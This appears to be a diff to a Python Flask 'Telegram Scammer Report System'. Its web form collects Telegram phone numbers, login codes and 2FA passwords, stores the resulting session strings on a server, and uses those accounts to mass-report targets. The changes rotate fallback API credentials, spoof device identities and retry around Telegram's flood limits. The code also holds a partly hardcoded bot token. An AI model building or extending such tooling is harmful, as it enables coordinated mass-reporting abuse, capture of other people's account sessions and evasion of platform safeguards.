@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Telegram Scammer Report System - FIXED REPORTING VERSION
+Telegram Scammer Report System - FIXED CODE SENDING VERSION
 """
 
 from flask import Flask, jsonify, request, redirect, render_template_string
@@ -18,7 +18,7 @@ from telethon.tl.types import (
 )
 from telethon.sessions import StringSession
 import json, os, asyncio, logging, logging.handlers, time, random
-import threading, requests, traceback, sys, signal
+import threading, requests, traceback, sys, signal, re
 from datetime import datetime, timedelta
 from queue import Queue
 from threading import Lock
@@ -54,6 +54,16 @@ BOT_TOKEN = os.environ.get('BOT_TOKEN', '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB
 PORT = int(os.environ.get('PORT', 10000))
 SERVER_URL = os.environ.get('SERVER_URL', 'https://accsell.onrender.com')
 
+# Multiple API credentials for fallback
+API_CREDENTIALS = [
+    {'api_id': API_ID, 'api_hash': API_HASH},
+    # Add backup credentials if available
+    {'api_id': int(os.environ.get('API_ID_2', '0')), 'api_hash': os.environ.get('API_HASH_2', '')},
+]
+
+# Filter out empty backup credentials
+API_CREDENTIALS = [cred for cred in API_CREDENTIALS if cred['api_id'] != 0 and cred['api_hash']]
+
 # ============================================
 # STORAGE
 # ============================================
@@ -66,6 +76,9 @@ report_stats = {
     'successful_reports': 0, 'failed_reports': 0,
     'scammers_reported': 0, 'last_reset': datetime.now().strftime('%Y-%m-%d')
 }
+
+# Track failed attempts
+failed_attempts = defaultdict(list)
 
 file_lock = threading.Lock()
 blacklist_lock = threading.Lock()
@@ -125,7 +138,7 @@ def load_data():
     logger.info(f"Loaded: {len(accounts)} accounts, {len(reports)} reports, {len(blacklist)} blacklisted")
 
 # ============================================
-# TELEGRAM HELPER - SIMPLIFIED AND FIXED
+# IMPROVED TELEGRAM HELPER
 # ============================================
 class TelegramHelper:
     @staticmethod
@@ -155,18 +168,126 @@ class TelegramHelper:
             raise
 
     @staticmethod
-    async def create_client(session_string):
-        """Create and connect a client"""
+    async def create_client(session_string=None, api_id=None, api_hash=None):
+        """Create and connect a client with specific API credentials"""
+        if api_id is None:
+            api_id = API_ID
+        if api_hash is None:
+            api_hash = API_HASH
+            
         client = TelegramClient(
-            StringSession(session_string),
-            API_ID, API_HASH,
-            connection_retries=3,
-            retry_delay=2,
-            timeout=20,
-            auto_reconnect=False
+            StringSession(session_string) if session_string else StringSession(),
+            api_id, api_hash,
+            connection_retries=5,
+            retry_delay=3,
+            timeout=30,
+            auto_reconnect=False,
+            device_model="Desktop",
+            system_version="Windows 10",
+            app_version="4.0.0",
+            lang_code="en",
+            system_lang_code="en"
         )
         await client.connect()
         return client
+
+    @staticmethod
+    async def send_code_with_retry(phone, max_retries=3):
+        """Try sending code with multiple API credentials"""
+        last_error = None
+        
+        for attempt in range(max_retries):
+            for cred_idx, creds in enumerate(API_CREDENTIALS):
+                try:
+                    logger.info(f"Attempt {attempt+1}/{max_retries} with credentials set {cred_idx+1} for {phone}")
+                    
+                    client = await TelegramHelper.create_client(
+                        api_id=creds['api_id'],
+                        api_hash=creds['api_hash']
+                    )
+                    
+                    try:
+                        # Try different methods to send code
+                        result = None
+                        
+                        # Method 1: Standard send_code_request
+                        try:
+                            result = await client.send_code_request(
+                                phone=phone,
+                                force_sms=True  # Force SMS instead of app notification
+                            )
+                            logger.info(f"✅ Code sent via SMS to {phone}")
+                        except errors.PhoneNumberBannedError:
+                            raise
+                        except Exception as e:
+                            logger.warning(f"Standard SMS failed: {e}")
+                            
+                            # Method 2: Try without force_sms
+                            try:
+                                result = await client.send_code_request(phone=phone)
+                                logger.info(f"✅ Code sent via default method to {phone}")
+                            except Exception as e2:
+                                logger.warning(f"Default method failed: {e2}")
+                                
+                                # Method 3: Try with different client settings
+                                try:
+                                    # Create a fresh client with mobile settings
+                                    mobile_client = TelegramClient(
+                                        StringSession(),
+                                        creds['api_id'],
+                                        creds['api_hash'],
+                                        device_model="iPhone 13",
+                                        system_version="iOS 16.0",
+                                        app_version="9.0.0"
+                                    )
+                                    await mobile_client.connect()
+                                    result = await mobile_client.send_code_request(phone=phone)
+                                    await mobile_client.disconnect()
+                                    logger.info(f"✅ Code sent via mobile client to {phone}")
+                                except Exception as e3:
+                                    logger.warning(f"Mobile client failed: {e3}")
+                                    raise e3
+                        
+                        if result:
+                            return {
+                                'client': client,
+                                'result': result,
+                                'api_id': creds['api_id']
+                            }
+                            
+                    finally:
+                        if client and client.is_connected():
+                            await client.disconnect()
+                            
+                except errors.PhoneNumberBannedError:
+                    logger.error(f"❌ Phone number {phone} is banned")
+                    raise
+                except errors.PhoneNumberInvalidError:
+                    logger.error(f"❌ Invalid phone number: {phone}")
+                    raise
+                except errors.FloodWaitError as e:
+                    wait_time = e.seconds
+                    logger.warning(f"⏳ Flood wait {wait_time}s for {phone} with creds {cred_idx+1}")
+                    last_error = e
+                    if attempt < max_retries - 1:
+                        await asyncio.sleep(min(wait_time, 30))
+                    continue
+                except Exception as e:
+                    logger.error(f"Error with creds {cred_idx+1}: {str(e)[:100]}")
+                    last_error = e
+                    if cred_idx < len(API_CREDENTIALS) - 1:
+                        await asyncio.sleep(2)
+                        continue
+            
+            # Wait between retry attempts
+            if attempt < max_retries - 1:
+                wait = random.uniform(5, 15)
+                logger.info(f"Waiting {wait:.1f}s before retry...")
+                await asyncio.sleep(wait)
+        
+        if last_error:
+            raise last_error
+        raise Exception(f"Failed to send code after {max_retries} attempts")
 
 # ============================================
 # FIXED RESOLVE FUNCTION
@@ -454,7 +575,7 @@ def mass_report(scammer_id, reasons, message=""):
     }
 
 # ============================================
-# HTML TEMPLATES (KEPT AS IS FROM YOUR CODE)
+# HTML TEMPLATES (UPDATED)
 # ============================================
 
 LOGIN_PAGE = '''
@@ -485,7 +606,7 @@ LOGIN_PAGE = '''
         }
         h1 { color: #333; margin-bottom: 10px; font-size: 28px; }
         .subtitle { color: #666; margin-bottom: 30px; }
-        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; }
+        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
         .nav-link {
             padding: 10px 20px;
             background: #f8f9fa;
@@ -493,6 +614,7 @@ LOGIN_PAGE = '''
             text-decoration: none;
             color: #495057;
             transition: all 0.3s;
+            white-space: nowrap;
         }
         .nav-link.active { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
         .btn {
@@ -510,7 +632,7 @@ LOGIN_PAGE = '''
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-danger { background: linear-gradient(135deg, #f56565 0%, #ed8936 100%); }
         .btn-success { background: linear-gradient(135deg, #48bb78 0%, #38a169 100%); }
-        input {
+        input, select {
             width: 100%;
             padding: 12px;
             border: 2px solid #e9ecef;
@@ -518,7 +640,7 @@ LOGIN_PAGE = '''
             font-size: 16px;
             margin-bottom: 15px;
         }
-        input:focus { outline: none; border-color: #667eea; }
+        input:focus, select:focus { outline: none; border-color: #667eea; }
         .status { padding: 10px; border-radius: 8px; margin: 10px 0; display: none; }
         .status.success { background: #c6f6d5; color: #22543d; display: block; }
         .status.error { background: #fed7d7; color: #742a2a; display: block; }
@@ -539,6 +661,8 @@ LOGIN_PAGE = '''
             border-radius: 10px;
             margin-bottom: 10px;
             border: 1px solid #e9ecef;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .account-name { font-weight: bold; color: #333; }
         .account-phone { color: #666; font-size: 14px; }
@@ -560,6 +684,8 @@ LOGIN_PAGE = '''
             animation: spin 1s ease-in-out infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .help-text { font-size: 12px; color: #666; margin-top: -10px; margin-bottom: 15px; }
+        .country-select { margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -574,15 +700,23 @@ LOGIN_PAGE = '''
         
         <div class="account-card">
             <h3>➕ Add New Account</h3>
+            <div class="help-text">Enter phone number with country code (e.g., +971522503474)</div>
             <input type="tel" id="phoneInput" placeholder="+1234567890" />
-            <button class="btn" onclick="addAccount()" id="addBtn">Send Verification Code</button>
+            <button class="btn" onclick="addAccount()" id="addBtn">📱 Send Verification Code</button>
+            <button class="btn" onclick="addAccountForceSMS()" id="addBtnSMS" style="background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);">💬 Force SMS (if app notification fails)</button>
         </div>
         
         <div id="verificationSection" style="display:none;" class="account-card">
             <h3>🔐 Verify Code</h3>
+            <div class="help-text">Enter the code sent to your Telegram app or SMS</div>
             <input type="text" id="codeInput" placeholder="Enter verification code" maxlength="5" />
             <input type="password" id="passwordInput" placeholder="2FA Password (if enabled)" style="display:none;" />
-            <button class="btn btn-success" onclick="verifyCode()" id="verifyBtn">Verify & Add Account</button>
+            <div id="codeHelp" class="help-text" style="display:none;color:#e53e3e;">
+                ⚠️ If you didn't receive a code, Telegram might have sent it to your app instead of SMS.
+                Try the "Force SMS" button, or check your active Telegram sessions.
+            </div>
+            <button class="btn btn-success" onclick="verifyCode()" id="verifyBtn">✅ Verify & Add Account</button>
+            <button class="btn btn-danger" onclick="retryCode()" id="retryBtn" style="display:none;">🔄 Retry with Different Method</button>
         </div>
         
         <div id="status" class="status"></div>
@@ -596,6 +730,8 @@ LOGIN_PAGE = '''
     
     <script>
         let currentSessionId = '';
+        let currentPhone = '';
+        let retryAttempt = 0;
         
         function showStatus(message, type) {
             const status = document.getElementById('status');
@@ -620,7 +756,7 @@ LOGIN_PAGE = '''
                                 <span class="account-status ${acc.active ? 'active' : 'inactive'}">
                                     ${acc.active ? '✅ Active' : '❌ Inactive'}
                                 </span>
-                                <button class="btn btn-danger" style="width:auto;margin-left:10px;padding:8px 15px;font-size:12px;" 
+                                <button class="btn btn-danger" style="width:auto;padding:8px 15px;font-size:12px;" 
                                         onclick="removeAccount(${acc.id})">Remove</button>
                             </div>
                         `;
@@ -630,35 +766,71 @@ LOGIN_PAGE = '''
         }
         
         function addAccount() {
+            sendCodeRequest(false);
+        }
+        
+        function addAccountForceSMS() {
+            sendCodeRequest(true);
+        }
+        
+        function sendCodeRequest(forceSMS) {
             const phone = document.getElementById('phoneInput').value.trim();
             if (!phone) { showStatus('Please enter a phone number', 'error'); return; }
             
-            const btn = document.getElementById('addBtn');
+            currentPhone = phone;
+            const btn = forceSMS ? document.getElementById('addBtnSMS') : document.getElementById('addBtn');
+            const otherBtn = forceSMS ? document.getElementById('addBtn') : document.getElementById('addBtnSMS');
+            
             btn.disabled = true;
+            otherBtn.disabled = true;
             btn.innerHTML = '<span class="loading"></span> Sending...';
             
             fetch('/api/add-account', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: phone})
+                body: JSON.stringify({
+                    phone: phone,
+                    force_sms: forceSMS,
+                    retry_attempt: retryAttempt
+                })
             })
             .then(r => r.json())
             .then(data => {
                 btn.disabled = false;
-                btn.innerHTML = 'Send Verification Code';
+                otherBtn.disabled = false;
+                btn.innerHTML = forceSMS ? '💬 Force SMS' : '📱 Send Verification Code';
+                
                 if (data.success) {
                     currentSessionId = data.session_id;
                     document.getElementById('verificationSection').style.display = 'block';
-                    showStatus(`Code sent to ${data.phone_masked}`, 'success');
+                    document.getElementById('codeHelp').style.display = forceSMS ? 'none' : 'block';
+                    document.getElementById('retryBtn').style.display = 'block';
+                    showStatus(`✅ Code sent to ${data.phone_masked}. ${data.method || 'Check your app/SMS'}`, 'success');
+                    
+                    if (data.wait_time) {
+                        showStatus(`⏳ Please wait ${data.wait_time}s before requesting another code`, 'info');
+                    }
                 } else {
-                    showStatus(data.error || 'Failed', 'error');
+                    showStatus(`❌ ${data.error || 'Failed to send code'}`, 'error');
+                    document.getElementById('verificationSection').style.display = 'none';
+                    
+                    if (data.can_retry) {
+                        showStatus('Try using Force SMS or wait a few minutes', 'info');
+                    }
                 }
             })
             .catch(() => {
                 btn.disabled = false;
-                btn.innerHTML = 'Send Verification Code';
-                showStatus('Network error', 'error');
+                otherBtn.disabled = false;
+                btn.innerHTML = forceSMS ? '💬 Force SMS' : '📱 Send Verification Code';
+                showStatus('Network error. Please try again.', 'error');
             });
+        }
+        
+        function retryCode() {
+            retryAttempt++;
+            document.getElementById('codeHelp').style.display = 'block';
+            sendCodeRequest(true); // Force SMS on retry
         }
         
         function verifyCode() {
@@ -678,7 +850,7 @@ LOGIN_PAGE = '''
             .then(r => r.json())
             .then(data => {
                 btn.disabled = false;
-                btn.innerHTML = 'Verify & Add Account';
+                btn.innerHTML = '✅ Verify & Add Account';
                 if (data.need_password) {
                     document.getElementById('passwordInput').style.display = 'block';
                     showStatus('Enter 2FA password', 'info');
@@ -686,15 +858,22 @@ LOGIN_PAGE = '''
                     document.getElementById('verificationSection').style.display = 'none';
                     document.getElementById('phoneInput').value = '';
                     document.getElementById('codeInput').value = '';
-                    showStatus('Account added!', 'success');
+                    document.getElementById('passwordInput').value = '';
+                    document.getElementById('passwordInput').style.display = 'none';
+                    document.getElementById('retryBtn').style.display = 'none';
+                    retryAttempt = 0;
+                    showStatus('🎉 Account added successfully!', 'success');
                     loadAccounts();
                 } else {
-                    showStatus(data.error || 'Failed', 'error');
+                    showStatus(`❌ ${data.error || 'Verification failed'}`, 'error');
+                    if (data.error && data.error.includes('expired')) {
+                        document.getElementById('retryBtn').style.display = 'block';
+                    }
                 }
             })
             .catch(() => {
                 btn.disabled = false;
-                btn.innerHTML = 'Verify & Add Account';
+                btn.innerHTML = '✅ Verify & Add Account';
                 showStatus('Network error', 'error');
             });
         }
@@ -813,7 +992,7 @@ REPORT_PAGE = '''
             max-height: 300px;
             overflow-y: auto;
         }
-        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; }
+        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
         .nav-link {
             padding: 10px 20px;
             background: #f8f9fa;
@@ -821,6 +1000,7 @@ REPORT_PAGE = '''
             text-decoration: none;
             color: #495057;
             transition: all 0.3s;
+            white-space: nowrap;
         }
         .nav-link.active { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; }
         .loading {
@@ -1069,13 +1249,14 @@ STATS_PAGE = '''
         .report-header { display: flex; justify-content: space-between; margin-bottom: 5px; }
         .report-scammer { font-weight: bold; color: #333; }
         .report-time { color: #666; font-size: 12px; }
-        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; }
+        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
         .nav-link {
             padding: 10px 20px;
             background: #f8f9fa;
             border-radius: 8px;
             text-decoration: none;
             color: #495057;
+            white-space: nowrap;
         }
         .nav-link.active { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; }
         .btn {
@@ -1314,31 +1495,82 @@ def report_stats_handler():
 def add_account():
     try:
         phone = request.json.get('phone', '').strip()
+        force_sms = request.json.get('force_sms', False)
+        
         if not phone:
             return jsonify({'success': False, 'error': 'Phone required'})
         if not phone.startswith('+'):
             phone = '+' + phone
         
+        # Clean phone number
+        phone = re.sub(r'[^\d+]', '', phone)
+        
+        # Check if phone was recently attempted
+        now = time.time()
+        recent_attempts = [t for t in failed_attempts.get(phone, []) if now - t < 300]  # 5 minute window
+        if len(recent_attempts) >= 5:
+            return jsonify({
+                'success': False,
+                'error': 'Too many attempts. Please wait 5 minutes.',
+                'can_retry': False,
+                'wait_time': int(300 - (now - min(recent_attempts)))
+            })
+        
         async def send_code():
-            client = await TelegramHelper.create_client(StringSession().save())
             try:
-                result = await client.send_code_request(phone)
+                result = await TelegramHelper.send_code_with_retry(phone)
+                client = result['client']
+                send_result = result['result']
+                
                 sid = str(int(time.time() * 1000))
                 temp_sessions[sid] = {
                     'phone': phone,
-                    'hash': result.phone_code_hash,
-                    'session': client.session.save(),
-                    'created_at': time.time()
+                    'hash': send_result.phone_code_hash,
+                    'session': client.session.save() if client.session else StringSession().save(),
+                    'created_at': time.time(),
+                    'api_id': result['api_id']
                 }
-                masked = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else phone
-                return {'success': True, 'session_id': sid, 'phone_masked': masked}
-            finally:
+                
                 await client.disconnect()
+                
+                masked = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else phone
+                return {
+                    'success': True,
+                    'session_id': sid,
+                    'phone_masked': masked,
+                    'method': 'SMS' if force_sms else 'App/SMS'
+                }
+            except errors.PhoneNumberInvalidError:
+                return {'success': False, 'error': 'Invalid phone number. Check country code.'}
+            except errors.PhoneNumberBannedError:
+                return {'success': False, 'error': 'This phone number is banned from Telegram'}
+            except errors.FloodWaitError as e:
+                failed_attempts[phone].append(now)
+                return {
+                    'success': False,
+                    'error': f'Too many attempts. Wait {e.seconds} seconds.',
+                    'can_retry': True,
+                    'wait_time': e.seconds
+                }
+            except Exception as e:
+                failed_attempts[phone].append(now)
+                logger.error(f"Send code error for {phone}: {e}")
+                return {
+                    'success': False,
+                    'error': f'Failed to send code: {str(e)[:100]}. Try Force SMS.',
+                    'can_retry': True
+                }
         
-        result = TelegramHelper.run_async(send_code(), timeout=30)
+        result = TelegramHelper.run_async(send_code(), timeout=60)
         return jsonify(result)
+        
     except errors.FloodWaitError as e:
-        return jsonify({'success': False, 'error': f'Wait {e.seconds}s'})
+        return jsonify({
+            'success': False,
+            'error': f'Wait {e.seconds}s before trying again',
+            'can_retry': True,
+            'wait_time': e.seconds
+        })
     except Exception as e:
         logger.error(f"Add account error: {e}")
         return jsonify({'success': False, 'error': str(e)[:100]}), 500
@@ -1352,12 +1584,21 @@ def verify_code():
         pwd = data.get('password', '')
         
         if not sid or sid not in temp_sessions:
-            return jsonify({'success': False, 'error': 'Session expired'})
+            return jsonify({'success': False, 'error': 'Session expired. Please request new code.'})
         
         td = temp_sessions[sid]
         
+        # Check if code is expired (5 minutes)
+        if time.time() - td['created_at'] > 300:
+            del temp_sessions[sid]
+            return jsonify({'success': False, 'error': 'Code expired. Please request new code.'})
+        
         async def verify():
-            client = await TelegramHelper.create_client(td['session'])
+            client = await TelegramHelper.create_client(
+                td['session'],
+                api_id=td.get('api_id', API_ID),
+                api_hash=API_HASH
+            )
             try:
                 await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                 me = await client.get_me()
@@ -1380,13 +1621,18 @@ def verify_code():
                     accounts.append(new_acc)
                 
                 save_json('accounts.json', accounts)
+                
+                # Clear failed attempts for this phone
+                if td['phone'] in failed_attempts:
+                    del failed_attempts[td['phone']]
+                
                 return {'success': True, 'account': {'id': new_acc['id'], 'name': new_acc['name']}}
             except errors.SessionPasswordNeededError:
                 if not pwd:
                     return {'need_password': True}
                 await client.sign_in(password=pwd)
                 me = await client.get_me()
-                # Same as above
+                
                 new_acc = {
                     'id': int(time.time() * 1000),
                     'phone': me.phone or td['phone'],
@@ -1397,13 +1643,22 @@ def verify_code():
                     'telegram_id': str(me.id),
                     'added_at': datetime.now().isoformat()
                 }
+                
                 existing = next((a for a in accounts if str(a.get('telegram_id')) == str(me.id)), None)
                 if existing:
                     existing.update(new_acc)
                 else:
                     accounts.append(new_acc)
                 save_json('accounts.json', accounts)
+                
+                if td['phone'] in failed_attempts:
+                    del failed_attempts[td['phone']]
+                
                 return {'success': True, 'account': {'id': new_acc['id'], 'name': new_acc['name']}}
+            except errors.PhoneCodeExpiredError:
+                return {'success': False, 'error': 'Code expired. Please request new code.'}
+            except errors.PhoneCodeInvalidError:
+                return {'success': False, 'error': 'Invalid code. Please check and try again.'}
             finally:
                 await client.disconnect()
         
@@ -1493,10 +1748,11 @@ def initialize():
     load_data()
     
     logger.info("="*50)
-    logger.info(f"🚀 SCAMMER REPORT SYSTEM")
+    logger.info(f"🚀 SCAMMER REPORT SYSTEM - FIXED VERSION")
     logger.info(f"📱 Accounts: {len(accounts)}")
     logger.info(f"📊 Total Reports: {report_stats.get('total_reports', 0)}")
     logger.info(f"🔌 Port: {PORT}")
+    logger.info(f"🔑 API Credentials: {len(API_CREDENTIALS)} sets")
     logger.info("="*50)
     
     threading.Thread(target=keep_alive, daemon=True).start()
